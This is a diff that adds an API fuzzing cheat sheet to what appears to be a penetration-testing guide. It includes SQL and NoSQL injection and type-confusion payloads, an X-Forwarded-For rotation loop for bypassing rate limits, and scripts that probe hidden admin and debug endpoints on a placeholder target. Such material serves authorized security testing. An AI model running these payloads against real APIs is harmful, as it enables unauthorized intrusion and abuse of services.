@@ -133,3 +133,48 @@ done; echo
 | Schema-aware fuzz | Mutate per declared type |
 | Inventory | Map of all reachable endpoints |
 | Rate-limit key | Value the limiter counts on |
+
+---
+
+## Cheat Sheet — API Fuzzing Payloads
+
+### Parameter Discovery
+
+```bash
+arjun -u https://target.com/api/v1/users -m GET
+arjun -u https://target.com/api/v1/users -m POST
+ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc all -fc 404
+```
+
+### Type Confusion
+
+```json
+{"id": -1}
+{"id": 99999999999999999999}
+{"id": "1 OR 1=1"}
+{"id": {"$ne": null}}
+{"id": [1, 2, 3]}
+{"amount": 1e309}
+{"name": ""}
+```
+
+### Rate Limit Bypass
+
+```bash
+# X-Forwarded-For rotation
+for i in $(seq 1 60); do
+  curl -sS -o /dev/null -w "%{http_code} " -H "X-Forwarded-For: 10.1.$((i/250)).$((i%250+1))" https://target.com/api/v1/items
+done
+
+# Other headers to vary
+X-Real-IP, X-Originating-IP, X-Client-IP, True-Client-IP
+```
+
+### Hidden Endpoint Discovery
+
+```bash
+for p in /api/internal /api/admin /actuator /debug /metrics /health /api/v0 /api/beta /api/graphql; do
+  code=$(curl -sS -o /dev/null -w '%{http_code}' "https://target.com$p")
+  [ "$code" != "404" ] && echo "$p → $code"
+done
+```
